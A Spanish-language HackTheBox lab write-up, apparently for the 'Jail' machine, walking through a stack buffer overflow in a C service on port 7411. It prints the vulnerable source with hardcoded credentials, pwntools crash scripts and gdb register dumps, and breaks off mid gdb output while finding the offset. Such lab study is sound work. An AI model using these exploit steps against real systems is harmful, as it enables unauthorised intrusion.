@@ -1,0 +1,936 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Jail HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/jail.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Jail HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Jail de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Jail de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Jail HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Jail HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Jail de la plataforma de HackTheBox","headline":"Writeup Jail HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Jail HackTheBox</h1>
+          <p>Resolución de la máquina Jail de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.10.34
+Nmap scan report for 10.10.10.34
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+7411/tcp  open  daqstream
+20048/tcp open  mountd</span>
+</code></pre></div></div>
+
+<div><p>Primero enumeraremos el sitio web pero mas que fuzzear podemos ver en el diccionario las coincidencias de jail asi nos ahorramos fuerza bruta, solo encontramos 2 coincidencias</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ grep </span><span class="p">jail /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+jail
+jailuser</span>
+</code></pre></div></div>
+
+<div><p>El directorio jail no existe pero en jail user encontramos una carpeta dev</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Al abrir el directorio encontramos un codigo en c, un compilador y un binario compilado</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Ejecutamos el binario pero... no es que sea muy descriptivo con lo que hace</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ./jail 
+</span>
+</code></pre></div></div>
+
+<div><p>Ya que tenemos el codigo podemos leerlo y saber a detalle lo que hace el binario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">#include </span><span class="s2">&ltstdio.h>
+</span><span class="kd">#include </span><span class="s2">&ltstdlib.h>
+</span><span class="kd">#include </span><span class="s2">&ltnetdb.h>
+</span><span class="kd">#include </span><span class="s2">&ltnetinet/in.h>
+</span><span class="kd">#include </span><span class="s2">&ltstring.h>
+</span><span class="kd">#include </span><span class="s2">&ltunistd.h>
+</span><span class="kd">#include </span><span class="s2">&lttime.h>
+
+</span><span class="k">int </span><span class="p">debugmode;
+</span><span class="k">int </span><span class="na">handle</span><span class="p">(</span><span class="k">int </span><span class="no">sock</span><span class="p">);
+</span><span class="k">int </span><span class="na">auth</span><span class="p">(</span><span class="k">char </span><span class="kd">*</span><span class="no">username</span><span class="p">, </span><span class="k">char </span><span class="kd">*</span><span class="no">password</span><span class="p">);
+
+</span><span class="k">int </span><span class="na">auth</span><span class="p">(</span><span class="k">char </span><span class="kd">*</span><span class="no">username</span><span class="p">, </span><span class="k">char </span><span class="kd">*</span><span class="no">password</span><span class="p">) {
+    </span><span class="k">char </span><span class="p">userpass[</span><span class="na">16</span><span class="p">];
+    </span><span class="k">char </span><span class="kd">*</span><span class="p">response;
+    </span><span class="kd">if </span><span class="p">(debugmode </span><span class="kd">==</span><span class="na"> 1</span><span class="p">) {
+        </span><span class="k">printf</span><span class="p">(</span><span class="s2">"Debug: userpass buffer @ %p\n"</span><span class="p">, userpass);
+        </span><span class="k">fflush</span><span class="p">(stdout);
+    }
+    </span><span class="kd">if</span><span class="p"> (</span><span class="k">strcmp</span><span class="p">(username, </span><span class="s2">"admin"</span><span class="p">) </span><span class="kd">!=</span><span class="na"> 0</span><span class="p">) </span><span class="kd">return</span><span class="na"> 0</span><span class="p">;
+    </span><span class="kd">strcpy</span><span class="p">(userpass, password);
+    </span><span class="kd">if </span><span class="p">(</span><span class="k">strcmp</span><span class="p">(userpass, </span><span class="s2">"1974jailbreak!"</span><span class="p">)</span><span class="kd"> == </span><span class="na">0</span><span class="p">) {
+        </span><span class="kd">return </span><span class="na">1</span><span class="p">;
+    } </span><span class="kd">else</span><span class="p"> {
+        </span><span class="k">printf</span><span class="p">(</span><span class="s2">"Incorrect username and/or password.\n"</span><span class="p">);
+        </span><span class="kd">return</span><span class="na"> 0</span><span class="p">;
+    }
+    </span><span class="kd">return </span><span class="na">0</span><span class="p">;
+}
+
+</span><span class="k">int </span><span class="na">handle</span><span class="p">(</span><span class="k">int </span><span class="no">sock</span><span class="p">) {
+    </span><span class="k">int </span><span class="p">n;
+    </span><span class="k">int </span><span class="p">gotuser </span><span class="kd">= </span><span class="na">0</span><span class="p">;
+    </span><span class="k">int </span><span class="p">gotpass </span><span class="kd">= </span><span class="na">0</span><span class="p">;
+    </span><span class="k">char </span><span class="p">buffer[</span><span class="na">1024</span><span class="p">];
+    </span><span class="k">char </span><span class="p">strchr[</span><span class="na">2</span><span class="p">] </span><span class="kd">=</span><span class="s2"> "\n\x00"</span><span class="p">;
+    </span><span class="k">char </span><span class="kd">*</span><span class="p">token;
+    </span><span class="k">char </span><span class="p">username[</span><span class="na">256</span><span class="p">];
+    </span><span class="k">char </span><span class="p">password[</span><span class="na">256</span><span class="p">];
+    debugmode </span><span class="kd">=</span><span class="na"> 0</span><span class="p">;
+    </span><span class="k">memset</span><span class="p">(buffer, </span><span class="na">0</span><span class="p">, </span><span class="na">256</span><span class="p">);
+    dup2(sock, STDOUT_FILENO);
+    dup2(sock, STDERR_FILENO);
+    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK Ready. Send USER command.\n"</span><span class="p">);
+    </span><span class="k">fflush</span><span class="p">(stdout);
+    </span><span class="kd">while</span><span class="p">(</span><span class="na">1</span><span class="p">) {
+        n </span><span class="kd">=</span><span class="p"> read(sock, buffer, </span><span class="na">1024</span><span class="p">);
+        </span><span class="kd">if</span><span class="p"> (n </span><span class="kd"><</span><span class="na"> 0</span><span class="p">) {
+            </span><span class="k">perror</span><span class="p">(</span><span class="s2">"ERROR reading from socket"</span><span class="p">);
+            </span><span class="kd">return </span><span class="na">0</span><span class="p">;
+        }
+        token </span><span class="kd">=</span><span class="k"> strtok</span><span class="p">(buffer, strchr);
+        </span><span class="kd">while</span><span class="p"> (token </span><span class="kd">!=</span><span class="na"> NULL</span><span class="p">) {
+            </span><span class="kd">if </span><span class="p">(gotuser </span><span class="kd">==</span><span class="na"> 1</span><span class="kd"> && </span><span class="p">gotpass </span><span class="kd">== </span><span class="na">1</span><span class="p">) {
+                </span><span class="kd">break</span><span class="p">;
+            }
+            </span><span class="kd">if </span><span class="p">(</span><span class="k">strncmp</span><span class="p">(token, </span><span class="s2">"USER "</span><span class="p">,</span><span class="na"> 5</span><span class="p">)</span><span class="kd"> ==</span><span class="na"> 0</span><span class="p">) {
+                </span><span class="k">strncpy</span><span class="p">(username, token</span><span class="kd">+</span><span class="na">5</span><span class="p">, </span><span class="kd">sizeof</span><span class="p">(username));
+                gotuser</span><span class="kd">=</span><span class="na">1</span><span class="p">;
+                </span><span class="kd">if</span><span class="p"> (gotpass </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+                    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK Send PASS command.\n"</span><span class="p">);
+                    </span><span class="k">fflush</span><span class="p">(stdout);
+                }
+            } </span><span class="kd">else if </span><span class="p">(</span><span class="k">strncmp</span><span class="p">(token, </span><span class="s2">"PASS "</span><span class="p">, </span><span class="na">5</span><span class="p">) </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+                </span><span class="k">strncpy</span><span class="p">(password, token</span><span class="kd">+</span><span class="na">5</span><span class="p">, </span><span class="kd">sizeof</span><span class="p">(password));
+                gotpass</span><span class="kd">=</span><span class="na">1</span><span class="p">;
+                </span><span class="kd">if</span><span class="p"> (gotuser </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+                    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK Send USER command.\n"</span><span class="p">);
+                    </span><span class="k">fflush</span><span class="p">(stdout);
+                }
+            } </span><span class="kd">else if</span><span class="p"> (</span><span class="k">strncmp</span><span class="p">(token, </span><span class="s2">"DEBUG"</span><span class="p">, </span><span class="na">5</span><span class="p">) </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+                </span><span class="kd">if </span><span class="p">(debugmode </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+                    debugmode </span><span class="kd">=</span><span class="na"> 1</span><span class="p">;
+                    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK DEBUG mode on.\n"</span><span class="p">);
+                    </span><span class="k">fflush</span><span class="p">(stdout);
+                } </span><span class="kd">else if</span><span class="p"> (debugmode </span><span class="kd">==</span><span class="na"> 1</span><span class="p">) {
+                    debugmode </span><span class="kd">=</span><span class="na"> 0</span><span class="p">;
+                    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK DEBUG mode off.\n"</span><span class="p">);
+                    </span><span class="k">fflush</span><span class="p">(stdout);
+                }
+            }
+            token </span><span class="kd">=</span><span class="k"> strtok</span><span class="p">(</span><span class="na">NULL</span><span class="p">, strchr);
+        }
+        </span><span class="kd">if</span><span class="p"> (gotuser </span><span class="kd">==</span><span class="na"> 1 </span><span class="kd">&& </span><span class="p">gotpass </span><span class="kd">== </span><span class="na">1</span><span class="p">) {
+            </span><span class="kd">break</span><span class="p">;
+        }
+    }
+    </span><span class="kd">if </span><span class="p">(auth(username, password)) {
+        </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK Authentication success. Send command.\n"</span><span class="p">);
+        </span><span class="k">fflush</span><span class="p">(stdout);
+        n </span><span class="kd">=</span><span class="p"> read(sock, buffer, </span><span class="na">1024</span><span class="p">);
+        </span><span class="kd">if </span><span class="p">(n </span><span class="kd"><</span><span class="na"> 0</span><span class="p">) {
+            </span><span class="k">perror</span><span class="p">(</span><span class="s2">"Socket read error"</span><span class="p">);
+            </span><span class="kd">return </span><span class="na">0</span><span class="p">;
+        }
+        </span><span class="kd">if</span><span class="p"> (</span><span class="k">strncmp</span><span class="p">(buffer, </span><span class="s2">"OPEN"</span><span class="p">, </span><span class="na">4</span><span class="p">) </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+            </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK Jail doors opened."</span><span class="p">);
+            </span><span class="k">fflush</span><span class="p">(stdout);
+        } </span><span class="kd">else if</span><span class="p"> (</span><span class="k">strncmp</span><span class="p">(buffer, </span><span class="s2">"CLOSE"</span><span class="p">, </span><span class="na">5</span><span class="p">) </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+            </span><span class="k">printf</span><span class="p">(</span><span class="s2">"OK Jail doors closed."</span><span class="p">);
+            </span><span class="k">fflush</span><span class="p">(stdout);
+        } </span><span class="kd">else</span><span class="p"> {
+            </span><span class="k">printf</span><span class="p">(</span><span class="s2">"ERR Invalid command.\n"</span><span class="p">);
+            </span><span class="k">fflush</span><span class="p">(stdout);
+            </span><span class="kd">return </span><span class="na">1</span><span class="p">;
+        }
+    } </span><span class="kd">else</span><span class="p"> {
+        </span><span class="k">printf</span><span class="p">(</span><span class="s2">"ERR Authentication failed.\n"</span><span class="p">);
+        </span><span class="k">fflush</span><span class="p">(stdout);
+        </span><span class="kd">return </span><span class="na">0</span><span class="p">;
+    }
+    </span><span class="kd">return </span><span class="na">0</span><span class="p">;
+}
+
+</span><span class="k">int </span><span class="na">main</span><span class="p">(</span><span class="k">int </span><span class="no">argc</span><span class="p">,</span><span class="k"> char </span><span class="kd">*</span><span class="no">argv</span><span class="p">[]) {
+    </span><span class="k">int </span><span class="p">sockfd;
+    </span><span class="k">int </span><span class="p">newsockfd;
+    </span><span class="k">int </span><span class="p">port;
+    </span><span class="k">int </span><span class="p">clientlen;
+    </span><span class="k">char </span><span class="p">buffer[</span><span class="na">256</span><span class="p">];
+    </span><span class="k">struct </span><span class="p">sockaddr_in server_addr;
+    </span><span class="k">struct </span><span class="p">sockaddr_in client_addr;
+    </span><span class="k">int </span><span class="p">n;
+    </span><span class="k">int </span><span class="p">pid;
+    </span><span class="k">int </span><span class="p">sockyes;
+    sockyes </span><span class="kd">=</span><span class="na"> 1</span><span class="p">;
+    sockfd </span><span class="kd">=</span><span class="p"> socket(AF_INET, SOCK_STREAM, </span><span class="na">0</span><span class="p">);
+    </span><span class="kd">if</span><span class="p"> (sockfd </span><span class="kd"><</span><span class="na"> 0</span><span class="p">) {
+        </span><span class="k">perror</span><span class="p">(</span><span class="s2">"Socket error"</span><span class="p">);
+        </span><span class="k">exit</span><span class="p">(</span><span class="na">1</span><span class="p">);
+    }
+    </span><span class="kd">if </span><span class="p">(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, </span><span class="kd">&</span><span class="p">sockyes, </span><span class="kd">sizeof</span><span class="p">(</span><span class="k">int</span><span class="p">)) </span><span class="kd">==</span><span class="na"> -1</span><span class="p">) {
+        </span><span class="k">perror</span><span class="p">(</span><span class="s2">"Setsockopt error"</span><span class="p">);
+        </span><span class="k">exit</span><span class="p">(</span><span class="na">1</span><span class="p">);
+    }
+    </span><span class="k">memset</span><span class="p">((</span><span class="k">char</span><span class="k">*</span><span class="p">)</span><span class="kd">&</span><span class="p">server_addr, </span><span class="na">0</span><span class="p">, </span><span class="kd">sizeof</span><span class="p">(server_addr));
+    port </span><span class="kd">=</span><span class="na"> 7411</span><span class="p">;
+    server_addr.sin_family </span><span class="kd">=</span><span class="p"> AF_INET;
+    server_addr.sin_addr.s_addr </span><span class="kd">=</span><span class="p"> INADDR_ANY;
+    server_addr.sin_port </span><span class="kd">=</span><span class="p"> htons(port);
+    </span><span class="kd">if </span><span class="p">(bind(sockfd, (</span><span class="k">struct </span><span class="p">sockaddr</span><span class="kd">*</span><span class="p">)</span><span class="kd">&</span><span class="p">server_addr, </span><span class="kd">sizeof</span><span class="p">(server_addr)) </span><span class="kd"><</span><span class="na"> 0</span><span class="p">) {
+        </span><span class="k">perror</span><span class="p">(</span><span class="s2">"Bind error"</span><span class="p">);
+        </span><span class="k">exit</span><span class="p">(</span><span class="na">1</span><span class="p">);
+    }
+    listen(sockfd, </span><span class="na">200</span><span class="p">);
+    clientlen </span><span class="kd">= sizeof</span><span class="p">(client_addr);
+    </span><span class="kd">while </span><span class="p">(</span><span class="na">1</span><span class="p">) {
+        newsockfd </span><span class="kd">=</span><span class="p"> accept(sockfd, (</span><span class="k">struct </span><span class="p">sockaddr</span><span class="kd">*</span><span class="p">)</span><span class="kd">&</span><span class="p">client_addr, </span><span class="kd">&</span><span class="p">clientlen);
+        </span><span class="kd">if</span><span class="p"> (newsockfd </span><span class="kd">< </span><span class="na">0</span><span class="p">) {
+            </span><span class="k">perror</span><span class="p">(</span><span class="s2">"Accept error"</span><span class="p">);
+            </span><span class="k">exit</span><span class="p">(</span><span class="na">1</span><span class="p">);
+        }
+        pid </span><span class="kd">= </span><span class="p">fork();
+        </span><span class="kd">if</span><span class="p"> (pid </span><span class="kd"><</span><span class="na"> 0</span><span class="p">) {
+            </span><span class="k">perror</span><span class="p">(</span><span class="s2">"Fork error"</span><span class="p">);
+            </span><span class="k">exit</span><span class="p">(</span><span class="na">1</span><span class="p">);
+        }
+        </span><span class="p">if</span><span class="p"> (pid </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+            close(sockfd);
+            </span><span class="k">exit</span><span class="p">(handle(newsockfd));
+        } </span><span class="kd">else</span><span class="p"> {
+            close(newsockfd);
+        }
+    }
+}</span>
+</code></pre></div></div>
+
+<div><p>Revisemos un par de cosas, iniciando porque abre un socket en el puerto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">port </span><span class="kd">=</span><span class="na"> 7411</span><span class="p">;
+server_addr.sin_family </span><span class="kd">=</span><span class="p"> AF_INET;
+server_addr.sin_addr.s_addr </span><span class="kd">=</span><span class="p"> INADDR_ANY;
+server_addr.sin_port </span><span class="kd">=</span><span class="p"> htons(port);</span>
+</code></pre></div></div>
+
+<div><p>O tal vez el hecho de que podemos ver las credenciales en texto plano ...</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">if</span><span class="p"> (</span><span class="k">strcmp</span><span class="p">(username, </span><span class="s2">"admin"</span><span class="p">) </span><span class="kd">!=</span><span class="na"> 0</span><span class="p">) </span><span class="kd">return</span><span class="na"> 0</span><span class="p">;
+</span><span class="kd">strcpy</span><span class="p">(userpass, password);
+</span><span class="kd">if </span><span class="p">(</span><span class="k">strcmp</span><span class="p">(userpass, </span><span class="s2">"1974jailbreak!"</span><span class="p">)</span><span class="kd"> == </span><span class="na">0</span><span class="p">) {
+    </span><span class="kd">return </span><span class="na">1</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div><p>Nos conectamos con netcat y nos autenticamos pero... no hace nada en realidad</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat </span><span class="p">127.0.0.1 7411
+OK Ready. Send USER command.
+</span><span class="kd">USER admin</span><span class="p">
+OK Send PASS command.
+</span><span class="kd">PASS 1974jailbreak!</span><span class="p">
+OK Authentication success. Send command.
+ERR Invalid command.</span>
+</code></pre></div></div>
+
+<div><p>Tener en cuenta que esta definiendo un buffer de 16 bytes y usando la funcion vulnerable strcpy</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">char </span><span class="p">userpass[</span><span class="na">16</span><span class="p">];
+
+</span><span class="kd">strcpy</span><span class="p">(userpass, password);</span>
+</code></pre></div></div>
+
+<div><p>Entonces es vulnerable a un buffer overflow en PASS, por ahora veamos las protecciones, ninguna</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ checksec </span><span class="p">jail
+[</span><span class="na">*</span><span class="p">] './jail'
+    Arch:     i386-32-little
+    RELRO:    </span><span class="no">Partial RELRO</span><span class="p">
+    Stack:    </span><span class="kd">No canary found</span><span class="p">
+    NX:       </span><span class="kd">NX disabled</span><span class="p">
+    PIE:      </span><span class="kd">No PIE (0x8048000)</span><span class="p">
+    RWX:      </span><span class="kd">Has RWX segments</span>
+</code></pre></div></div>
+
+<div><p>Podemos ejecutar el binario con gdb siguiendo al proceso hijo de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gdb</span><span class="p"> -q ./jail
+Reading symbols from </span><span class="s2">./jail</span><span class="p">...
+(No debugging symbols found in </span><span class="s2">./jail</span><span class="p">)
+</span><span class="kd">gdb-peda$</span><span class="p"> set detach-on-fork off
+</span><span class="kd">gdb-peda$</span><span class="p"> set follow-fork-mode child
+</span><span class="kd">gdb-peda$</span><span class="p"> run
+Starting program: ./jail</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear un script en python que en el campo PASS envie 50 veces la A para corromperlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">remote
+
+payload </span><span class="kd">= </span><span class="k">b</span><span class="s2">"A" </span><span class="kd">*</span><span class="na"> 50</span><span class="p">
+
+shell </span><span class="kd">=</span><span class="p"> remote(</span><span class="s2">"127.0.0.1"</span><span class="p">, </span><span class="na">7411</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"OK Ready. Send USER command."</span><span class="p">)
+shell.sendline(</span><span class="k">b</span><span class="s2">"USER admin"</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"OK Send PASS command."</span><span class="p">)
+shell.sendline(</span><span class="k">b</span><span class="s2">"PASS " </span><span class="kd">+ </span><span class="p">payload)
+shell.close()</span>
+</code></pre></div></div>
+
+<div><p>Lo ejecutamos con python3 y podemos ver que el programa corriendo en gdb se corrompe</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="s2">+</span><span class="p">] Opening connection to 127.0.0.1 on port 7411: Done
+[</span><span class="na">*</span><span class="p">] Closed connection to 127.0.0.1 port 7411</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">gdb-peda$</span><span class="p"> run
+Starting program: ./jail 
+[Attaching after process 120676 fork to child process 121181]
+[New inferior 2 (process 121181)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="p">.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="p">.
+
+Thread 2.1 "jail" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xf7fc2500 (LWP 121181)]
+</span><span class="na">[----------------------------------registers-----------------------------------]
+</span><span class="s2">EAX</span><span class="p">: 0x0 
+</span><span class="s2">EBX</span><span class="p">: </span><span class="s2">0xf7e1cff4</span><span class="p"> --> 0x21cd8c 
+</span><span class="s2">ECX</span><span class="p">: </span><span class="na">0xf7e1e9b8</span><span class="p"> --> 0x0 
+</span><span class="s2">EDX</span><span class="p">: 0x1 
+</span><span class="s2">ESI</span><span class="p">: </span><span class="kd">0x8048e70</span><span class="p"> (&lt__libc_csu_init>:	push   ebp)
+</span><span class="s2">EDI</span><span class="p">: </span><span class="s2">0xf7ffcb80</span><span class="p"> --> 0x0 
+</span><span class="s2">EBP</span><span class="p">: 0x41414141 ('AAAA')
+</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xffffcf80</span><span class="p"> ('A' &ltrepeats 18 times>)
+</span><span class="s2">EIP</span><span class="p">: 0x41414141 ('AAAA')
+</span><span class="s2">EFLAGS</span><span class="p">: 0x10246 (</span><span class="s2">carry </span><span class="kd">PARITY </span><span class="s2">adjust </span><span class="kd">ZERO </span><span class="s2">sign trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)</span><span class="na">
+[-------------------------------------code-------------------------------------]</span><span class="kd">
+Invalid $PC address: 0x41414141</span><span class="na">
+[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="na">0xffffcf80</span><span class="p"> ('A' &ltrepeats 18 times>)
+0004| </span><span class="na">0xffffcf84</span><span class="p"> ('A' &ltrepeats 14 times>)
+0008| </span><span class="na">0xffffcf88</span><span class="p"> ("AAAAAAAAAA")
+0012| </span><span class="na">0xffffcf8c</span><span class="p"> ("AAAAAA")
+0016| </span><span class="na">0xffffcf90</span><span class="p"> --> 0xff004141 
+0020| </span><span class="na">0xffffcf94</span><span class="p"> --> 0x0 
+0024| </span><span class="na">0xffffcf98</span><span class="p"> --> 0x0 
+0028| </span><span class="na">0xffffcf9c</span><span class="p"> --> 0x41410000 ('')</span><span class="na">
+[------------------------------------------------------------------------------]
+</span><span class="p">Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">, </span><span class="s2">rodata</span><span class="p">, value
+Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
+</span><span class="na">0x41414141 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Se corrompe, crearemos un patron de caracteres especiales con una longitud de 50 bytes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">gdb-peda$</span><span class="p"> pattern_create 50
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+</span><span class="kd">gdb-peda$</span>
+</code></pre></div></div>
+
+<div><p>Modificamos el script para que envie el patrón de caracteres en lugar de 50 veces A</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">remote
+
+payload </span><span class="kd">= </span><span class="k">b</span><span class="s2">"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA"</span><span class="p">
+
+shell </span><span class="kd">=</span><span class="p"> remote(</span><span class="s2">"127.0.0.1"</span><span class="p">, </span><span class="na">7411</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"OK Ready. Send USER command."</span><span class="p">)
+shell.sendline(</span><span class="k">b</span><span class="s2">"USER admin"</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"OK Send PASS command."</span><span class="p">)
+shell.sendline(</span><span class="k">b</span><span class="s2">"PASS " </span><span class="kd">+ </span><span class="p">payload)
+shell.close()</span>
+</code></pre></div></div>
+
+<div><p>Antes de volver a correrlo necesitamos cerrarlo, volver a abrirlo y seguir al proceso hijo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gdb</span><span class="p"> -q ./jail
+Reading symbols from </span><span class="s2">./jail</span><span class="p">...
+(No debugging symbols found in </span><span class="s2">./jail</span><span class="p">)
+</span><span class="kd">gdb-peda$</span><span class="p"> set detach-on-fork off
+</span><span class="kd">gdb-peda$</span><span class="p"> set follow-fork-mode child
+</span><span class="kd">gdb-peda$</span><span class="p"> run
+Starting program: ./jail</span>
+</code></pre></div></div>
+
+<div><p>Corremos el script de nuevo y si volvemos al gdb de nuevo se corrompe tal como antes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="s2">+</span><span class="p">] Opening connection to 127.0.0.1 on port 7411: Done
+[</span><span class="na">*</span><span class="p">] Closed connection to 127.0.0.1 port 7411</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">gdb-peda$</span><span class="p"> run
+Starting program: ./jail 
+[Attaching after process 126562 fork to child process 127019]
+[New inferior 2 (process 127019)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "</span><span class="s2">/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="p">.
+
+Thread 2.1 "jail" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xf7fc2500 (LWP 127019)]
+</span><span class="na">[----------------------------------registers-----------------------------------]
+</span><span class="s2">EAX</span><span class="p">: 0x0 
+</span><span class="s2">EBX</span><span class="p">: </span><span class="s2">0xf7e1cff4</span><span class="p"> --> 0x21cd8c 
+</span><span class="s2">ECX</span><span class="p">: </span><span class="na">0xf7e1e9b8</span><span class="p"> --> 0x0 
+</span><span class="s2">EDX</span><span class="p">: 0x1 
+</span><span class="s2">ESI</span><span class="p">: </span><span class="kd">0x8048e70</span><span class="p"> (&lt__libc_csu_init>:	push   ebp)
+</span><span class="s2">EDI</span><span class="p">: </span><span class="s2">0xf7ffcb80</span><span class="p"> --> 0x0 
+</span><span class="s2">EBP</span><span class="p">: 0x44414128 ('(AAD')
+</span><span class="s2">ESP</span><span class="p">: </span><span class="na">0xffffcf80</span><span class="p"> ("A)AAEAAaAA0AAFAAbA")
+</span><span class="s2">EIP</span><span class="p">: 0x413b4141 ('AA;A')
+</span><span class="s2">EFLAGS</span><span class="p">: 0x10246 (</span><span class="s2">carry </span><span class="kd">PARITY </span><span class="s2">adjust </span><span class="kd">ZERO </span><span class="s2">sign trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
+</span><span class="na">[-------------------------------------code-------------------------------------]
+</span><span class="kd">Invalid $PC address: 0x413b4141
+</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="na">0xffffcf80</span><span class="p"> ("A)AAEAAaAA0AAFAAbA")
+0004| </span><span class="na">0xffffcf84</span><span class="p"> ("EAAaAA0AAFAAbA")
+0008| </span><span class="na">0xffffcf88</span><span class="p"> ("AA0AAFAAbA")
+0012| </span><span class="na">0xffffcf8c</span><span class="p"> ("AFAAbA")
+0016| </span><span class="na">0xffffcf90</span><span class="p"> --> 0xff004162 
